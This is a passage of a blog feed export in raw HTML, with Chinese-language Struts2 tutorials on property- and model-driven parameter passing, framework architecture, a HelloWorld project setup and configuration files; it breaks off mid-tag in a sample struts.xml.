class="comment">// 此处省略两个属性的getter和setter方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述 Action 类的代码中，定义了两个字符串字段 username 和 password，这两个字段分别用于对应页面上的用户名和密码这两个表单域。</p><h4 id="直接使用域对象字段驱动方式的数据传递"><a href="#直接使用域对象字段驱动方式的数据传递" class="headerlink" title="直接使用域对象字段驱动方式的数据传递"></a>直接使用域对象字段驱动方式的数据传递</h4><p>在基本数据类型字段驱动方式中，如果传入的数据很多，那么 Action 的属性也会变得很多，再加上属性对应的 getter/setter 方法，势必会导致 Action 非常臃肿。</p><p>为了解决这一问题，我们可以把属性的 getter/setter 方法从 Action 中提取出来单独作为一个域对象，并在相应的 Action 中直接使用这个域对象。此种方式中的域对象一般以 JavaBean 的形式实现，JavaBean 中所封装的属性要和页面中表单的属性一一对应。此时 JavaBean 将成为数据传递的载体，并可以在其他 Action 中使用。</p><p>Demo参考：<a href="http://c.biancheng.net/view/4095.html" target="_blank" rel="noopener">http://c.biancheng.net/view/4095.html</a></p><h2 id="模型驱动"><a href="#模型驱动" class="headerlink" title="模型驱动"></a>模型驱动</h2><p>在 Struts2 中，Action 还有另外一种方式处理请求参数，称为模型驱动（ModelDriven）。</p><p>模型驱动方式要求 Action 需要通过实现 ModelDriven 接口接收请求参数，并且要重写 getModel() 方法。getModel() 方法返回的就是 Action 所使用的数据模型对象。</p><p>与属性驱动中直接使用域对象字段驱动方式的数据传递类似，模型驱动方式也是通过 JavaBean 模型进行数据传递的。只要是普通的 JavaBean，就可以充当模型部分，并且 JavaBean 中所封装的属性要与表单的属性一一对应，JavaBean 就是数据传递的载体。</p><p>使用模型驱动方式时，Action 类中通过 getModel() 方法获取模型，其示例代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"><span class="keyword">import</span> com.mi1k7ea.User;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ModelDriven;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> <span class="keyword">implements</span> <span class="title">ModelDriven</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> User user = <span class="keyword">new</span> User();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getModel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用模型驱动时，其对应的表单页面也要做相应调整，调整后的代码片段如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"loginAction"</span> method=<span class="string">"post"</span> name=<span class="string">"form1"</span>&gt;</span><br><span class="line">    用户名：&lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>/&gt;&lt;br/&gt;</span><br><span class="line">    密码：&lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>/&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"登录"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>从上述代码中可以看出，使用 ModelDriver 的方式后，表单中的文本域名称已经不需要添加 user 前缀，页面上的 username 会自动对应到这个 Model 的 username 属性。</p><p>与属性驱动相比，模型驱动不需要在 Action 类中定义与表单元素一一对应的所有属性及其各属性的 getter 和 setter 方法，这减少了 Action 类中的代码量。在项目应用中具体使用哪种驱动方法，现给出以下几点建议。</p><ol><li>要统一整个系统中 Action 的驱动方法，即要么都使用属性驱动，要么都使用模型驱动。</li><li>如果持久层对象与表单中的属性是一一对应的关系，那么建议使用模型驱动，因为模型驱动方法使 Action 类中的代码更加整洁。</li><li>如果持久层对象与表单中的属性不是一一对应的关系，那么建议使用属性驱动，因为不是一一对应的关系时，系统中需要提供两个 JavaBean（一个对应表单提交的数据，一个用于持久层对象）。</li></ol><p>总之，属性驱动的方法和模型驱动的方法各有优缺点，在实际开发中，需要根据项目实际情况选择使用哪种驱动方式。  </p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/categories/Java/Struts2/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2基础篇之基本概念</title>
    <link href="https://www.mi1k7ea.com/2020/05/01/Struts2%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B9%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
    <id>https://www.mi1k7ea.com/2020/05/01/Struts2基础篇之基本概念/</id>
    <published>2020-04-30T16:00:00.000Z</published>
    <updated>2020-08-15T06:40:08.249Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>本笔记直接参考或引自如下链接文章：</p><p><a href="http://c.biancheng.net/struts2/" target="_blank" rel="noopener">http://c.biancheng.net/struts2/</a></p><p><a href="https://www.w3cschool.cn/struts_2/" target="_blank" rel="noopener">https://www.w3cschool.cn/struts_2/</a></p><h2 id="0x01-Struts2简介"><a href="#0x01-Struts2简介" class="headerlink" title="0x01 Struts2简介"></a>0x01 Struts2简介</h2><p>Struts2 是 Apache 软件组织推出的一个基于 MVC 模式的轻量级 Web 框架，自问世以来，就受到了广大 Web 开发者的欢迎。目前，Struts2 在 Java Web 开发领域中已占据了十分重要的地位。</p><p>目前为止，Struts 框架拥有两个主要版本：Struts1.x 和 Struts2.x。Struts1 是最早的基于 MVC 模式的轻量级 Web 框架，它能够合理划分代码结构，并包含验证框架、国际化框架等多种实用工具框架。</p><p>随着技术的不断进步，Struts1 的局限性也越来越多地暴露出来。为了符合更加灵活、高效的开发需求，Struts2 框架应运而生，并在逐渐取代 Struts1 框架。</p><p>Struts2 是在 Struts1 和 WebWork 技术（WebWork 是由 OpenSymphony 组织开发的、致力于组件化和代码重用的 J2EE Web 框架，它也是一个 MVC 框架）的基础上进行合并后的全新框架。</p><p>虽然 Struts2 的名字与 Struts1 相似，但其设计思想有很大不同，因为 Struts2 是以 WebWork 为核心的，它是 WebWork 技术与 Struts1 技术的结合，所以 Struts2 可以理解为 WebWork 的更新产品。</p><p>Struts2的优点如下：</p><ul><li><strong>POJO表单及POJO操作</strong> - Struts2 去除掉了Struts框架中的Action Forms部分。在Struts2框架下，你可以用任何一POJO来接收表单输入，同样的，你可以把任一POJO视为一个Action类。</li><li><strong>标签支持</strong> - Struts2 改进了标签表单，而新的标签可让开发人员减少代码编写量。</li><li><strong>AJAX支持</strong> - Struts2 被认可接收进Web 2.0技术，并创建了功能非常类似于标准的Struts2 标签的AJAX标签，把AJAX支持整合进其结果中。</li><li><strong>易于整合</strong> - Struts有多种整合方式可使用，现在与其他类型的框架，如Spring、Tiles、SiteMesh之类的，整合更为容易了。</li><li><strong>模板支持</strong> - 支持使用模板生成视图。</li><li><strong>插件支持</strong> - 有大量的插件可用于Struts2，而使用插件可以增强和扩大Struts2 核心行为。</li><li><strong>性能分析</strong> - Struts2 为调试和配置应用程序提供综合的性能分析，此外，Struts也以嵌入调试工具的形式提供集成调试。</li><li><strong>易于修改标签</strong> - 在Struts2 中，可使用Freemarker的模板对标签标记进行调整，而修改标签不需要JSP或是Java知识，基本的HTML、XML和CSS知识就足够了。</li><li><strong>促进减少配置</strong> - Struts2 使用各种设置的默认值促进减少配置，而你不需要再配置什么除非是偏离了Struts2 设定的默认设置。</li><li><strong>视图技术</strong> - Struts2 为多种视图选项（JSP、Freemarker、Velocity、XSLT等）提供支持。</li></ul><p>尽管Struts2 有一大列的优点，但我们还是要提到关于它的一些仍需不断改进的缺点：</p><ul><li><strong>更大的学习曲线</strong> - 使用Struts MVC，你必须要熟悉JSP、Servlet APIs标准以及一个大型、复杂的框架。</li><li><strong>文档缺乏</strong> - 相比于Servlet和JSP APIs标准，Struts的在线资源较少，许多初学者会发现Apache在线文档混乱并缺乏整理。</li><li><strong>不够透明</strong> - 相比于使用正常的基于Java的Web应用程序，使用Struts的应用程序有许多是进行在后台，这使得框架不易于理解。</li></ul><p>最后说明一点，一个好的框架应该提供各种类型的应用程序都可以使用的通用行为，Struts2 是最好的Web框架之一，并频繁用于RIA（Rich Internet Applications）的发展。</p><h2 id="0x02-Struts2目录结构和基础Jar包"><a href="#0x02-Struts2目录结构和基础Jar包" class="headerlink" title="0x02 Struts2目录结构和基础Jar包"></a>0x02 Struts2目录结构和基础Jar包</h2><p>Struts2 的官方下载网址为：<a href="http://struts.apache.org" target="_blank" rel="noopener">http://struts.apache.org</a></p><p>这里下载2.3.37版本来演示。</p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>下载成功后，将 struts-2.3.37-all.zip 压缩包进行解压，解压后的目录如图：</p><p><img src="/2020/05/01/Struts2基础篇之基本概念/2.png" alt=""></p><p>各个目录介绍如下表：</p><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td>apps</td><td>用于存放官方提供的 Struts2 示例程序，这些程序可以作为学习者的参考资料。各示例均为 war 文件，可以通过 zip 方式进行解压。</td></tr><tr><td>docs</td><td>用于存放官方提供的 Struts2 文档，包括 Struts2 的快速入门、Struts2 的文档，以及 API 文档等内容。</td></tr><tr><td>lib</td><td>用于存放 Struts2 的核心类库，以及 Struts2 的第三方插件类库。</td></tr><tr><td>src</td><td>用于存放该版本 Struts2 框架对应的源代码。</td></tr></tbody></table><p>打开其中的lib目录，可以看到 Struts2 开发中可能用到的所有 JAR 包（此版本有 106 个 JAR 包）。在一般的 Web 开发中，只需要将 lib 文件夹下所依赖的几个基础 JAR 包复制到 Web 项目的 WEB-INF/lib 路径下即可使用 Struts2 框架。</p><p>下面看看几个基础的Jar包。</p><h3 id="基础Jar包"><a href="#基础Jar包" class="headerlink" title="基础Jar包"></a>基础Jar包</h3><p>Struts2 2.3.37版本依赖的 JAR 包介绍如下表：</p><table><thead><tr><th>文件名</th><th>说   明</th></tr></thead><tbody><tr><td>asm-3.3.jar</td><td>操作 Java 字节码的类库</td></tr><tr><td>asm-commons-3.3.jar</td><td>提供了基于事件的表现形式</td></tr><tr><td>asm-tree-3.3.jar</td><td>提供了基于对象的表现形式</td></tr><tr><td>struts2-core-2.3.37.jar</td><td>Struts2 框架的核心类库</td></tr><tr><td>xwork-core-2.3.37.jar</td><td>Web Work 核心库，Struts2 的构建基础</td></tr><tr><td>ognl-3.0.6.jar</td><td>对象图导航语言（Object Graph Navigation Language），Struts2 框架通过其读/写对象的属性</td></tr><tr><td>freemarker-2.3.22.jar</td><td>Struts2 标签模板使用的类库</td></tr><tr><td>javassist-3.11.0.GA.jar</td><td>JavaScript 字节码解释器</td></tr><tr><td>commons-fileupload-1.4.jar</td><td>Struts2 文件上传组件依赖包</td></tr><tr><td>commons-io-2.2.jar</td><td>Struts2 的输入/输出，传文件依赖的 JAR</td></tr><tr><td>commons-lang-2.4.jar</td><td>包含一些数据类型工具，是对 java.lang 包的增强</td></tr><tr><td>log4j-api-2.2.jar</td><td>Struts2 的日志管理组件依赖包的 API</td></tr><tr><td>log4j-core-2.2.jar</td><td>Struts2 的日志管理组件依赖包</td></tr></tbody></table><p>可以看出，此版本的 Struts2 项目所依赖的基础 JAR 包共 13 个。Struts2 根据版本的不同所依赖的基础 JAR 包可能不完全相同，不过基本变化不大。</p><h2 id="0x03-Struts2架构"><a href="#0x03-Struts2架构" class="headerlink" title="0x03 Struts2架构"></a>0x03 Struts2架构</h2><p>Struts2是一个以MVC为基础的框架。</p><p>从一个高水平角度看，Struts2 是一个MVC拉动的（或MVC2）框架，Struts2 的模型-视图-控制器模式是通过以下五个核心部分进行实现的：</p><ul><li>操作（Actions）</li><li>拦截器（Interceptors）</li><li>值栈（Value Stack）/OGNL</li><li>结果（Result）/结果类型</li><li>视图技术</li></ul><p>而Struts2 与传统的MVC框架略有不同，因为它由Action扮演模型的角色，而不是控制器，虽然这样会有一些重叠。</p><p><img src="/2020/05/01/Struts2基础篇之基本概念/1.png" alt=""></p><p>上图描述了Struts2 高级系统架构下的模型、视图及控制器。控制器是通过Struts2 分派servlet过滤器以及拦截器进行实现，模型是通过Actions进行实现，而视图则是结果类型和结果的结合。值栈和OGNL提供共同的路线、链接以及与其他组件之间的集成。</p><p>除了上述部分，还有许多组件相关的信息。web应用程序组件、Actions组件、拦截器组件、结果组件等等。</p><p><strong>请求生命周期</strong></p><p>通过上述图片的描述，我们可以依照下面几点解释在Struts2 中用户的请求生命周期：</p><ul><li>用户发送一个资源需求的请求到服务器（例如：页面）。</li><li>核心控制器查看请求后确定适当的动作。</li><li>使用验证、文件上传等配置拦截器功能。</li><li>执行选择的动作来完成请求的操作。</li><li>另外，如果需要的话，配置的拦截器可做任何后期处理。</li><li>最后，由视图显示结果并返回给用户。</li></ul><h2 id="0x04-HelloWorld程序"><a href="#0x04-HelloWorld程序" class="headerlink" title="0x04 HelloWorld程序"></a>0x04 HelloWorld程序</h2><h3 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h3><p>在IDEA新建一个Web项目，命名为st2test，整个完整目录结构如图：</p><p><img src="/2020/05/01/Struts2基础篇之基本概念/4.png" alt=""></p><p>先导入如上lib目录中必需的基础Jar包。</p><h3 id="配置-Struts2-的核心过滤器"><a href="#配置-Struts2-的核心过滤器" class="headerlink" title="配置 Struts2 的核心过滤器"></a>配置 Struts2 的核心过滤器</h3><p>打开项目的 web.xml 文件，在文件中添加 Struts2 的核心过滤器 org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter，具体如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span> <span class="attr">xmlns:web</span>=<span class="string">"http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">id</span>=<span class="string">"WebApp_ID"</span> <span class="attr">version</span>=<span class="string">"3.0"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置Struts2核心过滤器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span></span><br><span class="line">            org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 在 web.xml 文件中，<code>&lt;filter&gt;</code> 标签中配置的信息就是 Struts2 的核心过滤器，该过滤器的名称为 struts2，过滤器类为 org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter，而 <code>&lt;filter-mapping&gt;</code> 标签中配置的是该过滤器的映射。</p><p>需要注意的是，在 Struts2.1 版本之前，所使用的核心过滤器类是 org.apache.struts2.dispatcher.FilterDispatcher，从 Struts2.1 版本之后，这个过滤器类已经不推荐使用了，而是使用 org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter 类。</p><h3 id="创建-Action-类"><a href="#创建-Action-类" class="headerlink" title="创建 Action 类"></a>创建 Action 类</h3><p>在项目的 src 目录下，新建一个名称为 com.mi1k7ea 的包，在包中创建一个名为 HelloWorldAction 的类，并使其继承 ActionSupport 类（Struts2 框架所提供的类）。在 HelloWorldAction 类中定义一个 execute() 方法，返回值为 SUCCESS，编辑后的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述 HelloWorldAction.java 中，execute() 方法的返回值 SUCCESS 是从父类中继承的常量字段，用于表示执行成功，并返回结果页面。execute() 方法的返回值对应 struts.xml 文件中 <code>&lt;result&gt;</code> 标签中 name 属性的值，Struts2 框架会根据 name 属性值执行对应处理结果下的视图资源。</p><h3 id="编写-Struts2-的配置文件"><a href="#编写-Struts2-的配置文件" class="headerlink" title="编写 Struts2 的配置文件"></a>编写 Struts2 的配置文件</h3><p>在 src 目录下新建一个名称为 struts.xml 的文件，编辑代码后如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定 Struts2 配置文件的 DTD 信息 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.3.dtd"&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Struts2配置文件的根元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Struts2的Action必须放在指定的包空间下定义 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"hello"</span> <span class="attr">namespace</span>=<span class="string">"/"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义 action，该 action 对应的类为 com.mi1k7ea.HelloWorldAction 类--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"helloWorld"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.HelloWorldAction"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 定义处理结果和视图资源之间的映射关系 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在 struts.xml 文件中，<code>&lt;action&gt;</code> 标签中定义了请求路径，以及与其对应的 Action 类的映射关系，子标签 <code>&lt;result&gt;</code> 定义了处理结果和视图资源之间的映射关系。</p><h3 id="创建视图首页文件"><a href="#创建视图首页文件" class="headerlink" title="创建视图首页文件"></a>创建视图首页文件</h3><p>在 web 目录下创建一个名称为 index.jsp 的页面文件，在其中编写一个超链接，用于访问 Action 对象，此链接指向的地址为 helloWorld.action，如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;首页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=<span class="string">"$&#123;pageContext.request.contextPath &#125;/helloWorld.action"</span>&gt;</span><br><span class="line">  第一个 Struts2 程序！</span><br><span class="line">&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="创建返回页面"><a href="#创建返回页面" class="headerlink" title="创建返回页面"></a>创建返回页面</h3><p>在 web 下再创建一个名称为 success.jsp 的文件，作为 Action 对象处理成功后的返回页面，如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;成功页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">您的第一个小程序执行成功，欢迎来到Struts2的世界！</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p><img src="/2020/05/01/Struts2基础篇之基本概念/5.png" alt=""></p><h2 id="0x05-Struts2工作流程"><a href="#0x05-Struts2工作流程" class="headerlink" title="0x05 Struts2工作流程"></a>0x05 Struts2工作流程</h2><p>Struts2工作流程图：</p><p><img src="/2020/05/01/Struts2基础篇之基本概念/3.png" alt=""></p><p>从上图所示的流程图中可以看出，一个请求在 Struts2 框架中的处理大概可以分为以下几个步骤。</p><p>1）首先客户端浏览器发送一个请求（HttpServletRequest）。</p><p>2）接着程序会调用 StrutsPrepareAndExecuteFilter，然后询问 ActionMapper 这个请求是否需要调用某个 Action。</p><p>3）如果 ActionMapper 决定需要调用某个 Action，StrutsPrepareAndExecuteFilter 会把请求的处理交给 ActionProxy。</p><p>4）ActionProxy 通过配置管理器（Configuration Manager）从配置文件（struts.xml）中读取框架的配置信息，从而找到需要调用的 Action 类。</p><p>5）ActionProxy 会创建一个 ActionInvocation 的实例。</p><p>6）ActionInvocation 使用命名模式调用 Action，在调用 Action 前，会依次调用所有配置的拦截器（Intercepter1、Intercepter2……）。</p><p>7）一旦 Action 执行完，则返回结果字符串，ActionInvocation 就会负责查找结果字符串对应的 Result，然后执行这个 Result。通常情况下 Result 会调用一些模板（JSP 等）呈现页面。</p><p>8）产生的 Result 信息返回给 ActionInvocation，在此过程中拦截器会被再次执行（顺序与 Action 执行之前相反）。</p><p>9）最后产生一个 HttpServletResponse 的响应行为，通过 StrutsPrepareAndExecuteFilter 反馈给客户端。</p><h2 id="0x06-Struts2配置文件"><a href="#0x06-Struts2配置文件" class="headerlink" title="0x06 Struts2配置文件"></a>0x06 Struts2配置文件</h2><p>这里介绍下Struts2中web.xml、struts.xml、struts-config.xml以及struts.properties等配置文件。</p><h3 id="struts-xml"><a href="#struts-xml" class="headerlink" title="struts.xml"></a>struts.xml</h3><p>struts.xml 是 Struts2 框架的核心配置文件，该文件主要用于配置 Action 和请求的对应关系，以及配置逻辑视图和物理视图（逻辑视图就是在 struts.xml 文件中配置的 <code>&lt;result&gt;</code> 元素，它的 name 属性值就是逻辑视图名；物理视图是指 <code>&lt;result&gt;</code> 元素中配置的结果页面，如 JSP 文件）资源的对应关系。</p><p>struts.xml 文件通常放在 Web 应用的 WEB-INF/classes 目录下，在该目录下的 struts.xml 文件可以被 Struts2 框架自动加载。由于 MyEclipse 开发工具在编译时会自动将 src 路径下的 struts.xml 文件编译后放到 WEB-INF/classes 路径下，所以直接将其放到项目的 src 路径下即可。</p><p>下面来看一个典型的 struts.xml 文件结构，如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">  "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"</span></span><br><span class="line"><span class="meta">  "http://struts.apache.org/dtds/struts-2.3.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;constant&gt;元素用常量的配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.enable.DynamicMethodInvocation"</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.devMode"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;package&gt;元素用于包配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"default"</span> <span class="attr">namespace</span>=<span class="string">"/"</span> <span class="attr">extends</span>=<span 